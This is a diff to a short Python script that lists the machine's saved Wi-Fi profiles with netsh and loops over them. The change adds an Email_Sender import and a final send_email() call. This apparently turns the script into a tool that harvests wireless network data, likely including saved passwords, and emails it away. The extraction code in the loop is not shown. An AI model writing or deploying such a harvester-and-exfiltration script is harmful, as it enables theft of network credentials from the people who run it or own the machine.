@@ -1,5 +1,6 @@
 import subprocess
 
+import Email_Sender
 
 data = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
 
@@ -41,3 +42,5 @@ for x in profiles:
     
     except subprocess.CalledProcessError:
         print("Encoding Error Occured")
+
+Email_Sender.send_email()
